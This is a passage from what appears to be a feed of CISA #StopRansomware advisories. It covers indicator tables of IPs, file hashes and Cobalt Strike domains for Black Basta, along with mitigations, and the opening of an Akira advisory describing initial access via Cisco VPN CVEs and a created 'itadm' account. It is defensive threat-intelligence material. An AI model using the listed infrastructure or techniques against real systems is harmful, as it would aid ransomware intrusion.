<td>185.219.221[.]136</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>64.176.219[.]106</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>5.78.115[.]67</td>
<td>your-server[.]de</td>
</tr>
<tr>
<td>207.126.152[.]242</td>
<td>xkpal.1a4a64b6.dns.blocktoday[.]net</td>
</tr>
<tr>
<td>46.8.16[.]77</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>185.7.214[.]79</td>
<td>VPN Server</td>
</tr>
<tr>
<td>185.220.100[.]240</td>
<td>Tor exit</td>
</tr>
<tr>
<td>107.189.30[.]69</td>
<td>Tor exit</td>
</tr>
<tr>
<td>5.183.130[.]92</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>185.220.101[.]149</td>
<td>Tor exit</td>
</tr>
<tr>
<td>188.130.218[.]39</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>188.130.137[.]181</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>46.8.10[.]134</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>155.138.246[.]122</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>80.239.207[.]200</td>
<td>winklen[.]ch</td>
</tr>
<tr>
<td>183.181.86[.]147</td>
<td>Xserver[.]jp</td>
</tr>
<tr>
<td>34.149.120[.]3</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>104.21.40[.]72</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.250.161[.]149</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>88.198.198[.]90</td>
<td>your-server[.]de; literoved[.]ru</td>
</tr>
<tr>
<td>35.244.153[.]44</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>35.212.86[.]55</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.251.163[.]236</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.160.81[.]203</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.149.36[.]179</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>104.21.26[.]145</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>83.243.40[.]10</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>35.227.194[.]51</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>35.190.31[.]54</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.120.190[.]48</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>116.203.186[.]178</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>34.160.17[.]71</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 9: File Indicators</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Filename</strong></th>
<th role=\"columnheader\"><strong>Hash</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>C:\\Users\\Public\\Audio\\Jun.exe</td>
<td>b6a4f4097367d9c124f51154d8750ea036a812d5badde0baf9c5f183bb53dd24</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\esx.zip</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\7zG.exe</td>
<td>f21240e0bf9f0a391d514e34d4fa24ecb997d939379d2260ebce7c693e55f061</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\7z.dll</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\db_Usr.sql</td>
<td>8501e14ee6ee142122746333b936c9ab0fc541328f37b5612b6804e6cdc2c2c6</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\db_Usr.sql</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Audio\\hv2.ps1</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\7zG.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\7z.dll</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\BitLogic.dll</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\NetApp.exe</td>
<td>4c897334e6391e7a2fa3cbcbf773d5a4</td>
</tr>
<tr>
<td>C:\\Users\\Public\\DataSoft.exe</td>
<td>2642ec377c0cee3235571832cb472870</td>
</tr>
<tr>
<td>C:\\Users\\Public\\BitData.exe</td>
<td>b3fe23dd4701ed00d79c03043b0b952e</td>
</tr>
<tr>
<td>C:\\Users\\Public\\DigitalText.dll</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\GeniusMesh.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>\\Device\\Mup\\{redacted}\\C$\\Users\\Public\\Music\\PROCEXP.sys</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>\\Device\\Mup\\{redacted}\\C$\\Users\\Public\\Music\\DumpNParse86.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>\\Device\\Mup\\{redacted}\\C$\\Users\\Public\\Music\\POSTDump.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>\\Device\\Mup\\{redacted}\\C$\\Users\\Public\\Music\\DumpNParse.exe</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\socksps.ps1</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\Thief.exe</td>
<td>034b5fe047920b2ae9493451623633b14a85176f5eea0c7aadc110ea1730ee79</td>
</tr>
<tr>
<td>
<p>C:\\Users\\All Users\\{redacted}\\GWT.ps1</p>
<p>C:\\Program Files\\MonitorIT\\GWT.ps1</p>
</td>
<td>8C68B2A794BA3D148CAE91BDF9C8D357289752A94118B5558418A36D95A5A45F</td>
</tr>
<tr>
<td>
<p>Winx86.exe&nbsp;</p>
<p><strong>Comment:</strong> alias for cmd.exe</p>
</td>
<td>&nbsp;</td>
</tr>
<tr>
<td>C:\\Users\\Public\\eucr.exe</td>
<td>3c65da7f7bfdaf9acc6445abbedd9c4e927d37bb9e3629f34afc338058680407</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>808c96cb90b7de7792a827c6946ff48123802959635a23bf9d98478ae6a259f9</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>3a8fc07cadc08eeb8be342452636a754158403c3d4ebff379a4ae66f8298d9a6</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>4ac69411ed124da06ad66ee8bfbcea2f593b5b199a2c38496e1ee24f9d04f34a</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>819cb9bcf62be7666db5666a693524070b0df589c58309b067191b30480b0c3a</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>c26a5cb62a78c467cc6b6867c7093fbb7b1a96d92121d4d6c3f0557ef9c881e0</td>
</tr>
<tr>
<td>C:\\Windows\\DS_c1.dll</td>
<td>d503090431fdd99c9df3451d9b73c5737c79eda6eb80c148b8dc71e84623401f</td>
</tr>
<tr>
<td>*\\instructions_read_me.txt</td>
<td>&nbsp;</td>
</tr>
</tbody>
</table>
<table class=\"tablesaw tablesaw-stack\" data-tablesaw-mode=\"stack\" data-tablesaw-minimap>
<caption><em>Table 10: Known Black Basta Cobalt Strike Domains</em></caption>
<thead>
<tr>
<th role=\"columnheader\" data-tablesaw-priority=\"persist\"><strong>Domain</strong></th>
<th role=\"columnheader\"><strong>Date/Time (UTC)/Time (UTC)</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>trailshop[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>realbumblebee[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>recentbee[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>investrealtydom[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>webnubee[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>artspathgroup[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>buyblocknow[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>currentbee[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>modernbeem[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>startupbusiness24[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>magentoengineers[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>childrensdolls[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>myfinancialexperts[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>limitedtoday[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>kekeoamigo[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>nebraska-lawyers[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>tomlawcenter[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>thesmartcloudusa[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>rasapool[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>artspathgroupe[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>specialdrills[.]com</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>thetrailbig[.]net</td>
<td>5/8/2024 6:37</td>
</tr>
<tr>
<td>consulheartinc[.]com</td>
<td>3/22/2024 15:35</td>
</tr>
<tr>
<td>otxcosmeticscare[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>otxcarecosmetics[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>artstrailman[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>ontexcare[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>trackgroup[.]net</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>businessprofessionalllc[.]com</td>
<td>3/15/2024 10:14</td>
</tr>
<tr>
<td>securecloudmanage[.]com</td>
<td>3/7/2024 10:42</td>
</tr>
<tr>
<td>oneblackwood[.]com</td>
<td>3/7/2024 10:42</td>
</tr>
<tr>
<td>buygreenstudio[.]com</td>
<td>3/7/2024 10:42</td>
</tr>
<tr>
<td>startupbuss[.]com</td>
<td>3/7/2024 10:42</td>
</tr>
<tr>
<td>onedogsclub[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>wipresolutions[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>recentbeelive[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>trailcocompany[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>trailcosolutions[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>artstrailreviews[.]com</td>
<td>3/4/2024 18:26</td>
</tr>
<tr>
<td>usaglobalnews[.]com</td>
<td>2/15/2024 5:56</td>
</tr>
<tr>
<td>topglobaltv[.]com</td>
<td>2/15/2024 5:56</td>
</tr>
<tr>
<td>startupmartec[.]net</td>
<td>2/15/2024 5:56</td>
</tr>
<tr>
<td>technologgies[.]com</td>
<td>1/2/2024 18:16</td>
</tr>
<tr>
<td>jenshol[.]com</td>
<td>1/2/2024 18:16</td>
</tr>
<tr>
<td>simorten[.]com</td>
<td>1/2/2024 18:16</td>
</tr>
<tr>
<td>investmentgblog[.]net</td>
<td><a>1/2/2024 18:16</a></td>
</tr>
<tr>
<td>protectionek[.]com</td>
<td>1/2/2024 18:16</td>
</tr>
</tbody>
</table>
<table>
<caption><em>Table 11: Suspected Black Basta Domains</em></caption>
<tbody>
<tr>
<td>airbusco[.]net</td>
</tr>
<tr>
<td>allcompanycenter[.]com</td>
</tr>
<tr>
<td>animalsfast[.]net</td>
</tr>
<tr>
<td>audsystemecll[.]net</td>
</tr>
<tr>
<td>auuditoe[.]com</td>
</tr>
<tr>
<td>bluenetworking[.]net</td>
</tr>
<tr>
<td>brendonline[.]com</td>
</tr>
<tr>
<td>businesforhome[.]com</td>
</tr>
<tr>
<td>caspercan[.]com</td>
</tr>
<tr>
<td>clearsystemwo[.]net</td>
</tr>
<tr>
<td>cloudworldst[.]net</td>
</tr>
<tr>
<td>constrtionfirst[.]com</td>
</tr>
<tr>
<td>erihudeg[.]com</td>
</tr>
<tr>
<td>garbagemoval[.]com</td>
</tr>
<tr>
<td>gartenlofti[.]com</td>
</tr>
<tr>
<td>getfnewsolutions[.]com</td>
</tr>
<tr>
<td>getfnewssolutions[.]com</td>
</tr>
<tr>
<td>investmendvisor[.]net</td>
</tr>
<tr>
<td>investmentrealtyhp[.]net</td>
</tr>
<tr>
<td>ionoslaba[.]com</td>
</tr>
<tr>
<td>jessvisser[.]com</td>
</tr>
<tr>
<td>karmafisker[.]com</td>
</tr>
<tr>
<td>kolinileas[.]com</td>
</tr>
<tr>
<td>maluisepaul[.]com</td>
</tr>
<tr>
<td>masterunix[.]net</td>
</tr>
<tr>
<td>monitor-websystem[.]net</td>
</tr>
<tr>
<td>monitorsystem[.]net</td>
</tr>
<tr>
<td>mytrailinvest[.]net</td>
</tr>
<tr>
<td>prettyanimals[.]net</td>
</tr>
<tr>
<td>reelsysmoona[.]net</td>
</tr>
<tr>
<td>seohomee[.]com</td>
</tr>
<tr>
<td>septcntr[.]com</td>
</tr>
<tr>
<td>softradar[.]net</td>
</tr>
<tr>
<td>startupbizaud[.]net</td>
</tr>
<tr>
<td>startuptechnologyw[.]net</td>
</tr>
<tr>
<td>steamteamdev[.]net</td>
</tr>
<tr>
<td>stockinvestlab[.]net</td>
</tr>
<tr>
<td>taskthebox[.]net</td>
</tr>
<tr>
<td>trailgroupl[.]net</td>
</tr>
<tr>
<td>treeauwin[.]net</td>
</tr>
<tr>
<td>unitedfrom[.]com</td>
</tr>
<tr>
<td>unougn[.]com</td>
</tr>
<tr>
<td>wardeli[.]com</td>
</tr>
<tr>
<td>welausystem[.]net</td>
</tr>
<tr>
<td>wellsystemte[.]net</td>
</tr>
<tr>
<td>withclier[.]com</td>
</tr>
</tbody>
</table>
<h3><strong>MITIGATIONS</strong></h3>
<p>The authoring organizations recommend all critical infrastructure organizations implement the mitigations below to improve your organization’s cybersecurity posture based on Black Basta’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s&nbsp;<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals\" title=\"Cross-Sector Cybersecurity Performance Goals\">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<ul>
<li><strong>Install updates for operating systems, software, and firmware as soon as they are released</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E\" title=\"Mitigating Known Vulnerabilities (1.E)\">CPG 1.E</a>]. Prioritize updating <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">Known Exploited Vulnerabilities (KEV)</a>.</li>
<li><strong>Require phishing-resistant multi-factor authentication (MFA)</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H\" title=\"Phishing-Resistant Multifactor Authentication (MFA) (2.H)\">CPG 2.H</a>] for as many services as possible.</li>
<li><strong>Implement recommendations, including training users to recognize and report phishing attempts&nbsp;</strong>[<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#BasicCybersecurityTraining2I\" title=\"Basic Cybersecurity Training (2.I)\">CPG 2.I</a>], from joint <a href=\"https://www.cisa.gov/resources-tools/resources/phishing-guidance-stopping-attack-cycle-phase-one\" title=\"Phishing Guidance: Stopping the Attack Cycle at Phase One\">Phishing Guidance: Stopping the Attack Cycle at Phase One</a>.</li>
<li><strong>Secure remote access software</strong> by applying mitigations from joint <a href=\"https://www.cisa.gov/resources-tools/resources/guide-securing-remote-access-software\" title=\"Guide to Securing Remote Access Software\">Guide to Securing Remote Access Software</a>.</li>
<li><strong>Make backups of critical systems and device configurations</strong> [<a href=\"https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#SystemBackups2R\" title=\"System Backups (2.R)\">CPG 2.R</a>] to enable devices to be repaired and restored.</li>
<li><strong>Apply mitigations from the joint&nbsp;</strong><a href=\"https://www.cisa.gov/stopransomware/ransomware-guide\" title=\"#StopRansomware Guide\"><strong>#StopRansomware Guide</strong></a>.</li>
</ul>
<p>The authoring organizations also recommend network defenders of HPH Sector and other critical infrastructure organizations to reference CISA’s <a href=\"https://www.cisa.gov/resources-tools/resources/mitigation-guide-healthcare-and-public-health-hph-sector\" title=\"Mitigation Guide: Healthcare and Public Health (HPH) Sector\">Mitigation Guide: Healthcare and Public Health (HPH) Sector</a> and HHS’s <a href=\"https://hphcyber.hhs.gov/performance-goals.html\" title=\"HPH Cybersecurity Performance Goals\">HPH Cybersecurity Performance Goals</a>, which provide best practices to combat pervasive cyber threats against organizations. Recommendations include the following:</p>
<ul>
<li><strong>Asset Management and Security</strong>: Cybersecurity professionals should identify and understand all relationships or interdependencies, functionality of each asset, what it exposes, and what software is running to ensure critical data and systems are protected appropriately. HPH Sector organizations should ensure&nbsp;electronic PHI (ePHI) is protected and compliant with the Health Insurance Portability and Accountability Act (HIPAA). Organizations can complete asset inventories using active scans, passive processes, or a combination of both techniques.</li>
<li><strong>Email Security and Phishing Prevention</strong>: Organizations should install modern anti-malware software and automatically update signatures where possible. For additional guidance, see CISA’s <a href=\"https://www.cisa.gov/resources-tools/resources/enhance-email-web-security\" title=\"Enhance Email &amp; Web Security\">Enhance Email and Web Security Guide</a>.
<ul>
<li><strong>Check for embedded or spoofed hyperlinks</strong>: Validate the URL of the link matches the text of the link itself. This can be achieved by hovering your cursor over the link to view the URL of the website to be accessed.</li>
</ul>
</li>
<li><strong>Access Management</strong>: Phishing-resistant MFA completes the same process but removes ‘people’ from the equation to help thwart social engineering scams and targeted phishing attacks that may have been successful using traditional MFA. The two main forms of phishing-resistant MFA are FIDO/Web Authentication (WebAuthn) authentication and Public Key Infrastructure (PKI)-based authentication. Prioritize phishing-resistant MFA on accounts with the highest risk, such as privileged administrative accounts on key assets. For additional information on phishing-resistant MFA, see CISA’s <a href=\"https://www.cisa.gov/sites/default/files/publications/fact-sheet-implementing-phishing-resistant-mfa-508c.pdf\" title=\"Implementing Phishing-Resistant MFA Guide\">Implementing Phishing-Resistant MFA Guide</a>.</li>
<li><strong>Vulnerability Management and Assessment</strong>: Once vulnerabilities are identified across your environment, evaluate and prioritize to appropriately deal with the posed risks according to your organization’s risk strategy. To assist with prioritization, it is essential to:
<ul>
<li><strong>Map your assets to business-critical functions.</strong> For vulnerability remediation, prioritize assets that are most critical for ongoing operations or which, if affected, could impact your organization’s business continuity, sensitive PII (or PHI) security, reputation, or financial position.</li>
<li><strong>Use threat intelligence information.</strong> For remediation, prioritize vulnerabilities actively exploited by threat actors. To assist, leverage CISA’s <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\" title=\"Known Exploited Vulnerabilities Catalog\">KEV Catalog</a> and other threat intelligence feeds.</li>
<li><strong>Leverage prioritization methodologies, ratings, and scores</strong>. The Common Vulnerability Scoring System (CVSS) assesses the technical severity of vulnerabilities. The Exploit Prediction Scoring System (EPSS) measures the likelihood of exploitation and can help with deciding which vulnerabilities to prioritize. CISA’s <a href=\"https://www.cisa.gov/stakeholder-specific-vulnerability-categorization-ssvc\" title=\"Stakeholder-Specific Vulnerability Categorization (SSVC)\">Stakeholder-Specific Vulnerability Categorization (SSVC)</a> methodology leverages decision trees to prioritize relevant vulnerabilities into four decisions, Track, Track*, Attend, and Act based on exploitation status, technical impact, mission prevalence, and impacts to safety and public-wellbeing.</li>
</ul>
</li>
</ul>
<h3><strong>VALIDATE SECURITY CONTROLS</strong></h3>
<p>In addition to applying mitigations, the authoring organizations recommend exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring organizations recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see Tables 2-6).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>The authoring organizations recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h3><strong>REFERENCES</strong></h3>
<ol>
<li><a href=\"https://www.sentinelone.com/labs/black-basta-ransomware-attacks-deploy-custom-edr-evasion-tools-tied-to-fin7-threat-actor/\" title=\"Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor\">SentinelOne: Black Basta Ransomware | Attacks Deploy Custom EDR Evasion Tools Tied to FIN7 Threat Actor</a></li>
<li><a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-blackbasta\" title=\"Ransomware Spotlight - Black Basta\">Trend Micro: Ransomware Spotlight - Black Basta</a></li>
<li><a href=\"https://www.kroll.com/en/insights/publications/cyber/black-basta-technical-analysis\" title=\"Black Basta - Technical Analysis\">Kroll: Black Basta - Technical Analysis</a></li>
<li><a href=\"https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/black-basta\" title=\"Who Is Black Basta?\">Who Is Black Basta? (blackberry.com)</a></li>
<li><a href=\"https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\" title=\"Threat Assessment - Black Basta Ransomware\">Palo Alto Networks: Threat Assessment - Black Basta Ransomware</a></li>
</ol>
<h3><strong>REPORTING</strong></h3>
<p>Your organization has no obligation to respond or provide information back to FBI in response to this joint CSA. If, after reviewing the information provided, your organization decides to provide information to FBI, reporting must be consistent with applicable state and federal laws.</p>
<p>FBI is interested in any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
<p>Additional details of interest include: a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.</p>
<p>FBI, CISA, and HHS do not encourage paying ransom as payment does not guarantee victim files will be&nbsp;recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents to FBI’s&nbsp;<a href=\"https://www.ic3.gov/\" title=\"Internet Crime Complain Center\">Internet Crime Complain Center (IC3)</a>, a local FBI <a href=\"https://www.fbi.gov/contact-us/field-offices\" title=\"Field Offices\">Field Office</a>, or CISA via the agency’s&nbsp;<a href=\"https://www.cisa.gov/forms/report\" title=\"Incident Reporting System\">Incident Reporting System</a> or its 24/7 Operations Center (<a href=\"mailto:report@cisa.gov\" title=\"Report to CISA\">report@cisa.gov</a> or by calling 1-844-Say-CISA [1-844-729-2472]).</p>
<h3><strong>DISCLAIMER</strong></h3>
<p>The information in this report is being provided “as is” for informational purposes only. FBI, CISA, HHS, and MS-ISAC do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, HHS, and MS-ISAC.</p>
<h3><strong>VERSION HISTORY</strong></h3>
<p><strong>May 10, 2024:</strong> Initial version.</p>
</div>
") (pubDate nil "Fri, 10 May 2024 09:02:21 EDT") (creator nil "CISA") (guid ((isPermaLink . "false")) "/node/21435"))) ("#StopRansomware: Akira Ransomware" "<h3><strong>SUMMARY</strong></h3>
<p><em><strong>Note: </strong>This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit&nbsp;</em><a href=\"https://www.cisa.gov/stopransomware\"><em>stopransomware.gov</em></a><em> to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.</em></p>
<p>The United States’ Federal Bureau of Investigation (FBI), Cybersecurity and Infrastructure Security Agency (CISA), Europol’s European Cybercrime Centre (EC3), and the Netherlands’ National Cyber Security Centre (NCSC-NL)&nbsp;are releasing this joint CSA to disseminate known Akira ransomware&nbsp;IOCs and TTPs identified through FBI investigations and trusted third party reporting as recently as February 2024.</p>
<p>Since March 2023, Akira ransomware has impacted a wide range of businesses and critical infrastructure entities in North America, Europe, and Australia. In April 2023, following an initial focus on Windows systems,&nbsp;Akira threat actors deployed a Linux variant targeting VMware ESXi virtual machines. As of January 1, 2024, the ransomware group has impacted over 250 organizations and claimed approximately $42 million (USD) in ransomware proceeds.</p>
<p>Early versions of the Akira&nbsp;ransomware variant were written in C++ and encrypted files with a&nbsp;<code>.akira</code> extension; however, beginning in August 2023, some Akira attacks began deploying Megazord, using Rust-based code which encrypts files with a&nbsp;<code>.powerranges</code> extension.&nbsp;&nbsp;Akira threat actors have continued to use both Megazord and Akira, including Akira_v2 (identified by trusted third party investigations) interchangeably.</p>
<p>The FBI, CISA, EC3, and NCSC-NL encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.</p>
<p>Download the PDF version of this report:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-04/aa24-109a-stopransomware-akira-ransomware_2.pdf\" class=\"c-file__link\" target=\"_blank\">AA24-109A #StopRansomware: Akira Ransomware</a>
    <span class=\"c-file__size\">(PDF,       591.05 KB
  )</span>
  </div>
</div>
<p>For a downloadable copy of IOCs, see:</p>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-04/AA24-109A.stix_0.xml\" class=\"c-file__link\" target=\"_blank\">AA24-109A STIX XML</a>
    <span class=\"c-file__size\">(XML,       114.01 KB
  )</span>
  </div>
</div>





<div class=\"c-file\">
    <div class=\"c-file__download\">
    <a href=\"/sites/default/files/2024-04/AA24-109A-StopRansomware-Akira-Ransomware.stix_0.json\" class=\"c-file__link\" target=\"_blank\">AA24-109A STIX JSON</a>
    <span class=\"c-file__size\">(JSON,       67.80 KB
  )</span>
  </div>
</div>
<h3><strong>TECHNICAL DETAILS</strong></h3>
<p><strong>Note:</strong> This advisory uses the MITRE ATT&amp;CK® for Enterprise framework, version 14. See <a href=\"https://attack.mitre.org/versions/v14/matrices/enterprise/\" title=\"Enterprise Matrix\">MITRE ATT&amp;CK for Enterprise</a> for all referenced tactics and techniques.</p>
<h4><strong>Initial Access</strong></h4>
<p>The FBI and cybersecurity researchers have observed Akira threat actors obtaining initial access to organizations through a virtual private network (VPN) service without multifactor authentication (MFA) configured[<a href=\"https://www.fortinet.com/blog/threat-research/ransomware-roundup-akira\" title=\"Ransomware Roundup - Akira\">1</a>], mostly using known Cisco vulnerabilities [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1190/\" title=\"Exploit Public-Facing Application\">T1190</a>]&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-3259\" title=\"CVE-2020-3259\">CVE-2020-3259</a> and&nbsp;<a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-20269\" title=\"CVE-2023-20269\">CVE-2023-20269</a>.[<a href=\"https://blogs.cisco.com/security/akira-ransomware-targeting-vpns-without-multi-factor-authentication\" title=\"Akira Ransomware Targeting VPNs without Multi-Factor Authentication\">2</a>],[<a href=\"https://www.truesec.com/hub/blog/akira-ransomware-and-exploitation-of-cisco-anyconnect-vulnerability-cve-2020-3259\" title=\"Akira Ransomware and Exploitation of Cisco Anyconnect Vulnerability CVE-2020-3259\">3</a>],[<a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-akira\" title=\"Ransomware Spotlight: Akira\">4</a>] Additional methods of initial access include the use of external-facing services such as Remote Desktop Protocol (RDP) [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1133/\" title=\"External Remote Services\">T1133</a>],&nbsp;spear phishing [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/001/\" title=\"Phishing: Spearphishing Attachment\">T1566.001</a>][<a href=\"https://attack.mitre.org/versions/v14/techniques/T1566/002/\" title=\"Phishing: Spearphishing Link\">T1566.002</a>], and the abuse of valid credentials[<a href=\"https://attack.mitre.org/versions/v14/techniques/T1078/\" title=\"Valid Accounts\">T1078</a>].[<a href=\"https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-akira\" title=\"Ransomware Spotlight: Akira\">4</a>]</p>
<h4><strong>Persistence and Discovery</strong></h4>
<p>Once initial access is obtained, Akira threat actors attempt to abuse the functions of domain controllers by creating new domain accounts [<a href=\"https://attack.mitre.org/versions/v14/techniques/T1136/002/\" title=\"Create Account: Domain Account\">T1136.002</a>] to establish persistence. In some instances, the FBI identified Akira threat actors creating an administrative account named <code>itadm</code>.</p>
